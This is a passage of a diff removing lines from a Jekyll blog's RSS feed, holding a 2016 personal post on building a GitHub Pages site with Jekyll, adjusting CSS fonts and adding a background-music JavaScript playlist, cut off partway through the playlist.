-        <pubDate>Sat, 09 Apr 2016 00:00:00 +0800</pubDate>
-        <link>/web/2016/04/09/windows-2003-r2-aspx/</link>
-        <guid isPermaLink="true">/web/2016/04/09/windows-2003-r2-aspx/</guid>
-        
-        <category>windows</category>
-        
-        <category>aspx</category>
-        
-        
-        <category>web</category>
-        
-      </item>
-    
-      <item>
-        <title>Use github and jekyll start github pages</title>
-        <description>&lt;h1 id=&quot;x01-useful-links-to-learn&quot;&gt;0x01 useful links to learn&lt;/h1&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.zhihu.com/question/20223939
-https://github.com/jacobtomlinson/carte-noire
-http://www.tuicool.com/articles/RZbEV3
-https://help.github.com/articles/configuring-jekyll/
-https://help.github.com/articles/setting-up-your-github-pages-site-locally-with-jekyll/
-http://jekyllrb.com/docs/github-pages/#project-page-url-structure
-http://jekyllcn.com/
-https://learnetto.com/blog/tutorial-how-to-host-your-websites-for-free-using-github-pages
-http://www.jimmylauzau.com/blog/2016/03/23/the-awesomeness-that-is-github-pages
-http://pikipity.github.io/blog/kramdown-syntax-chinese-1.html   kramdown语法
-http://pikipity.github.io/blog/kramdown-syntax-chinese-2.html   kramdown语法
-http://platinhom.gitcafe.io/2015/11/06/Kramdown-note/           kramdown语法
-https://ruby-china.org/topics/14005                     web中文字体应用指南(i use 文泉驿等宽正黑 )
-http://platinhom.github.io/2015/06/06/Markdown-note/    kramdown-note
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;From those links,I learned those steps(assume with jekyll installed):&lt;/p&gt;
-
-&lt;h1 id=&quot;x02-steps&quot;&gt;0x02 Steps&lt;/h1&gt;
-
-&lt;h4 id=&quot;gem-install-github-pagesvery-important&quot;&gt;1&amp;gt;gem install github-pages(very important)&lt;/h4&gt;
-
-&lt;h4 id=&quot;jekyll-new-myblog&quot;&gt;2&amp;gt;jekyll new myblog&lt;/h4&gt;
-
-&lt;h4 id=&quot;git-clone-httpsgithubcomjacobtomlinsoncarte-noiregit&quot;&gt;3&amp;gt;git clone https://github.com/jacobtomlinson/carte-noire.git&lt;/h4&gt;
-
-&lt;h4 id=&quot;cp-carte-noire-myblog&quot;&gt;4&amp;gt;cp carte-noire/*/ myblog&lt;/h4&gt;
-
-&lt;h4 id=&quot;vim-myblogcssstylescssmy-modified-stylescss-file-in-the-below&quot;&gt;5&amp;gt;vim myblog/css/style.scss(my modified style.scss file in the below)&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://raw.githubusercontent.com/xinghuacai/blog_backup/master/css/style.scss
-&amp;gt;however,I do not know how to change highlight code block&#39;s font,I tried to make it by modifying css file,it did not work,till now the font of code block looks ugly.  
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h4 id=&quot;vim-myblogposts2016-04-09-github-jekyll-blogmd&quot;&gt;6&amp;gt;vim myblog/_posts/2016-04-09-github-jekyll-blog.md&lt;/h4&gt;
-
-&lt;h4 id=&quot;jekyll-serve---watchthis-command-will-build-a-site-folder&quot;&gt;7&amp;gt;jekyll serve –watch(this command will build a _site folder)&lt;/h4&gt;
-
-&lt;h4 id=&quot;create-a-new-repository-in-githubxinghuacaigithubio&quot;&gt;8&amp;gt;create a new repository in github:xinghuacai.github.io&lt;/h4&gt;
-
-&lt;h4 id=&quot;cd-myblogsites--git-init--git-add---git-commit--a--m-my-blog-v1&quot;&gt;9&amp;gt;cd myblog/_sites &amp;amp;&amp;amp; git init &amp;amp;&amp;amp; git add . &amp;amp;&amp;amp; git commit -a -m “my blog v1”&lt;/h4&gt;
-
-&lt;h4 id=&quot;git-remote-add-origin-httpsgithubcomxinghuacaixinghuacaigithubiogit&quot;&gt;10&amp;gt;git remote add origin https://github.com/xinghuacai/xinghuacai.github.io.git&lt;/h4&gt;
-
-&lt;h4 id=&quot;push--u-origin-master&quot;&gt;11&amp;gt;push -u origin master&lt;/h4&gt;
-
-&lt;h4 id=&quot;succeed--httpxinghuacaigithubio&quot;&gt;12&amp;gt;succeed–&amp;gt;http://xinghuacai.github.io&lt;/h4&gt;
-
-&lt;h1 id=&quot;x03-update-articles&quot;&gt;0x03 Update articles&lt;/h1&gt;
-
-&lt;p&gt;&lt;em&gt;Notice&lt;/em&gt;,we need not to checkout --orphan gh-pages like some blogs telled us to ,a master branch is enough to do it.There is a .gitignore file in myblog/.gitignore (copied from carte-noire) which ignores _sites folder when git myblog/ to github as a blog_backup
-(https://github.com/xinghuacai/blog_backup).From then on,when I update new articles,I could only update xinghuacai.github.io repository,and take blog_badkup repository as a backup on github.So,later if I need add new article to xinghuacai.github.io,I will do:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim myblog/_posts/newarticle.md(file name in 201x-0x-0x-xxx-xxx.md format)
-cd myblog
-rm -r _site
-jekyll serve --watch(or jekyll build,jekyll serve contains jekyll build function)
-mkdir ../tmp
-cd ../tmp
-git init
-git pull https://github.com/xinghuacai/xinghuacai.github.io.git
-cp -r ../myblog/_site/* .
-git status
-git add .
-git commit -a -m &quot;update articles&quot;
-git remote add origin https://github.com/xinghuacai/xinghuacai.github.io.git
-git push -u origin master
-rm -r ../tmp
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h1 id=&quot;x04-update&quot;&gt;0x04 Update&lt;/h1&gt;
-&lt;h2&gt;16-04-13&lt;/h2&gt;
-&lt;h4&gt;&amp;gt;&amp;gt;&amp;gt;finally I find how to change the font-family in the code block to make code block looks beautiful,not ugly any longer. 1,2,3 arrows in below pic show the process to find how to change the code block font.Firstly,move mouse&#39;s arrow to any code block like arrow 1 in below pic,and right click mouse to chose &quot;use firebug to view elements&quot;.Secondly,left click mouse on the words like arrow 2 in below pic,and move mouse on &quot;font-family&quot;,then I find it&#39;s &quot;monospace&quot;,and the source css file is from &quot;\_includes\head.html&quot;,the value is href=&quot;//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bbbbootstrap.min.css&quot;,download it to local css directory and rename it my_code.css,change \_includes\head.html to set the value to &quot;../../../../../css/my_code.css&quot;.Finally,change monospace to &quot;文泉驿等宽正黑&quot; where needed in my_code.css &lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;../../../../../pic/jekyll/code_block_font.png&quot; /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h2&gt;16-04-13&lt;/h2&gt;
-&lt;h4&gt;&amp;gt;&amp;gt;&amp;gt;when I finished till this moment,I try to use my cell phone to visit http://xinghuacai.github.io,find my cell phone without vpn can not open http://xinghuacai.github.io.Later,I search the blog file to figure out the wrong source,get style.scss has three &quot;@import url(http://googleapi....)&quot;,then I download the three css file from http://googleapi... ,rename them and change it to &quot;@import url(&quot;1.css&quot;)&quot;,then I tried to visit http://xinghuacai.github.io again with my cell phone,the result was fantastic! Very fast to browse it without vpn!&lt;/h4&gt;
-&lt;h2&gt;16-04-15&lt;/h2&gt;
-&lt;h4&gt;&amp;gt;&amp;gt;&amp;gt;finally I find how to change the html&#39;s templet to make the htmls be my own style,analyse the templet like below pic:&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinghuacai/pic/master/jekyll/default.png&quot; /&gt;&lt;/p&gt;
-&lt;h4&gt;tips:&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-1&amp;gt;@media:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;in css/style.scss file,when my screen is large screen,if there is no lg attribute in @media parameters but has sm(small) attribute or other attribute belongs to @media,the result will follow sm value or other attribute of @media  
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-2&amp;gt;css/style.scss:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; .index -&amp;gt; 1000px -&amp;gt; decide index.html&#39;s width
- .article -&amp;gt; @media -&amp;gt; width:50% margin-left:25%   -&amp;gt; decide post.html&#39;s width
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;3&amp;gt;to modify html:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;the best way is: use firebug to view element and find css file belongs to the html,then modify it  
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;4&amp;gt;col-md-12,col-md-6 col-md-6,col-md-1 col-md-11&lt;/p&gt;
-&lt;h2&gt;16-04-17&lt;/h2&gt;
-&lt;h4&gt;1&amp;gt;添加背景音乐并实现切换页面时音乐连续不重播&lt;/h4&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;to achieve this function:
-cd myblog
-cp index.html index_bak.html
-jekyll serve --watch
-cp _\_site/index.html index2.html
-vi bgmusic.html
---------------content--------------
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;embed&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;list.m3u&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;autostart=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;volume=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;50&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;loop=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/embed&amp;gt;&lt;/span&gt; 
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
---------------content-------------
-vi list.m3u
---------------content-------------
-https://raw.githubusercontent.com/xinghuacai/music/master/my%20will.mp3
-https://raw.githubusercontent.com/xinghuacai/music/master/%E5%B7%B4%E8%B5%AB%E6%97%A7%E7%BA%A6.mp3
-https://raw.githubusercontent.com/xinghuacai/music/master/with%20you.mp3
-https://raw.githubusercontent.com/xinghuacai/music/master/every%20heart.mp3
-https://raw.githubusercontent.com/xinghuacai/music/master/%E4%B8%8D%E5%88%86%E6%89%8B%E7%9A%84%E6%81%8B%E7%88%B1.mp3
-https://raw.githubusercontent.com/xinghuacai/music/master/%E9%A3%8E%E5%BA%A6.mp3
-https://raw.githubusercontent.com/xinghuacai/music/master/%E6%A1%83%E8%8A%B1%E6%89%87.mp3
-https://raw.githubusercontent.com/xinghuacai/music/master/%E4%B8%89%E5%9B%BD%E6%9D%80.mp3
-
---------------content-------------
-vi index.html
---------------content-------------
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;frameset&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rows=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;100%,*&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;frame&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index2.html&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/frame&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;frame&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bgmusic.html&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/frame&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/frameset&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
---------------content-------------
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h4&gt;2&amp;gt;update blog command&lt;/h4&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd myblog
-vi _posts/newblog.md(filename format eg.2016-01-01-xx.md)
-mv index.html tmp.html
-cp index_bak.html index.html
-------open another terminal------
-rm -r _site/
-jekyll serve --watch
-------above in the terminal------
-cp _site/index.html index2.html
-mv tmp.html index.html
-
-or just:(&quot;ifconfig &amp;amp;&quot; means let command &quot;ifconfig&quot; running in background)
-
-cd myblog
-vi _posts/newblog.md(filename format eg.2016-01-01-xx.md)
-pkill jekyll
-cp index.html tmp.html &amp;amp;&amp;amp; cp index_bak.html index.html &amp;amp;&amp;amp; sh -c &quot;rm -r _site/ &amp;amp; jekyll serve --watch &amp;amp; sleep 3 &amp;amp;&amp;amp; exit&quot; &amp;amp;&amp;amp; cp _site/index.html index2.html &amp;amp;&amp;amp; cp tmp.html index.html
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;em&gt;notice&lt;/em&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;main command:
-cp index.html tmp.html &amp;amp;&amp;amp; cp index_bak.html index.html &amp;amp;&amp;amp; sh -c &quot;rm -r _site/ &amp;amp; jekyll serve --watch &amp;amp; sleep 3 &amp;amp;&amp;amp; exit&quot; &amp;amp;&amp;amp; cp _site/index.html index2.html &amp;amp;&amp;amp; cp tmp.html index.html
-in main command start a sh subcommond: 
-sh -c &quot;rm -r _site/ &amp;amp; jekyll serve --watch &amp;amp; sleep 3 &amp;amp;&amp;amp; exit&quot; 
-1.this subcommond is started by the main commond in the gnome-terminal,&quot;exit&quot; only means exit the main command from a gnome-terminal
-2.though the gnome-terminal is closed,the &quot;jekyll serve --watch&quot; in the subcommand still works.This may be caused by the special command of jekyll,jekyll command may start a system background commnad.So after the main commnd,there is always a &quot;jekyll serve --watch&quot; running in the background
-3.if I need to update some articles,I should exucete &quot;pkill jekyll&quot; and then execute the main command again,otherwise I will get a address and port bind twice error
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;so the final update comannds are:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd myblog
-vi _posts/newblog.md
-
-A plan:
-pkill jekyll
-cp index.html tmp.html &amp;amp;&amp;amp; cp index_bak.html index.html &amp;amp;&amp;amp; sh -c &quot;rm -r _site/ &amp;amp; jekyll serve --watch &amp;amp; sleep 3 &amp;amp;&amp;amp; exit&quot; &amp;amp;&amp;amp; cp _site/index.html index2.html &amp;amp;&amp;amp; cp tmp.html index.html
-B plan!!!:
-pkill jekyll &amp;amp;&amp;amp; cp index.html tmp.html &amp;amp;&amp;amp; cp index_bak.html index.html &amp;amp;&amp;amp; sh -c &quot;rm -r _site/ &amp;amp; jekyll serve --watch &amp;amp; sleep 3 &amp;amp;&amp;amp; exit&quot; &amp;amp;&amp;amp; cp _site/index.html index2.html &amp;amp;&amp;amp; cp tmp.html index.html
-
-A plan:
-    mkdir ../tmp
-    cd ../tmp
-    git init
-    git pull https://github.com/xinghuacai/xinghuacai.github.io.git
-    cp -r ../myblog/_site/* .
-    git status
-    git add .
-    git status
-    git commit -a -m &quot;update articles&quot;
-    git remote add origin https://github.com/xinghuacai/xinghuacai.github.io.git
-    git push -u origin master
-    rm -r ../tmp
-B plan!!!:
-mkdir ../tmp &amp;amp;&amp;amp; cd ../tmp &amp;amp;&amp;amp; git init &amp;amp;&amp;amp; git pull https://github.com/xinghuacai/xinghuacai.github.io.git &amp;amp;&amp;amp; cp -r ../myblog/_site/* . &amp;amp;&amp;amp; git status &amp;amp;&amp;amp; git add . &amp;amp;&amp;amp; git status &amp;amp;&amp;amp; git commit -a -m &quot;update articles&quot; &amp;amp;&amp;amp; git remote add origin https://github.com/xinghuacai/xinghuacai.github.io.git &amp;amp;&amp;amp; git push -u origin master &amp;amp;&amp;amp; rm -r ../tmp
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2&gt;16-04-19&lt;/h2&gt;
-&lt;h4 style=&quot;color:red&quot;&gt;实现每次进入主页后循环随机播放背景音乐&lt;/h4&gt;
-&lt;p&gt;1&amp;gt;原来bgmusic.html代码如下：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;embed&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;list.m3u&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;autostart=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;volume=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;50&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;loop=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;2&amp;gt;换成如下代码，将原bgmusic.html废弃，另存为bgmusic.html.version1,同目录下list.m3u文件也废弃&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;audio&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;myaudio&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/audio&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/my%20will.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E5%B7%B4%E8%B5%AB%E6%97%A7%E7%BA%A6.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/with%20you.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/every%20heart.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E4%B8%8D%E5%88%86%E6%89%8B%E7%9A%84%E6%81%8B%E7%88%B1.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E9%A3%8E%E5%BA%A6.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E6%A1%83%E8%8A%B1%E6%89%87.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E4%B8%89%E5%9B%BD%E6%9D%80.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E6%88%90%E9%BE%99%E3%80%81%E9%87%91%E5%96%9C%E5%96%84%20-%20%E7%BE%8E%E4%B8%BD%E7%9A%84%E7%A5%9E%E8%AF%9D.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E9%A3%8E%E4%BA%91%20-%20%E9%9B%84%E9%9C%B8%E5%A4%A9%E4%B8%8B%20-%20%E6%B0%B8%E8%BF%9C%E6%B0%B8%E8%BF%9C.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E5%8F%A4%E5%A4%A9%E4%B9%90%20-%20%E7%A5%9E%E9%9B%95%E4%BE%A0%E4%BE%A3%E4%B8%BB%E9%A2%98%E6%9B%B2.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E9%AC%BC%E6%9D%9F%E5%8D%83%E5%AF%BB%20-%20%E6%9C%88%E5%85%89%20-%20%E6%97%A5%E6%9C%AC%E7%BB%8F%E5%85%B8%E7%88%B1%E6%83%85%E7%94%B5%E8%A7%86%E5%89%A7%E4%B8%BB%E9%A2%98%E6%9B%B2.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E5%81%87%E5%A6%82%E7%88%B1%E6%9C%89%E5%A4%A9%E6%84%8F%20More%20Than%20Love.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E9%87%91%E8%8E%8E%20-%20%E6%98%9F%E6%9C%88%E7%A5%9E%E8%AF%9D.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://raw.githubusercontent.com/xinghuacai/music/master/%E6%9D%8E%E6%85%A7%E7%8F%8D%20-%20%E7%88%B1%E6%AD%BB%E4%BA%86%E6%98%A8%E5%A4%A9.mp3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
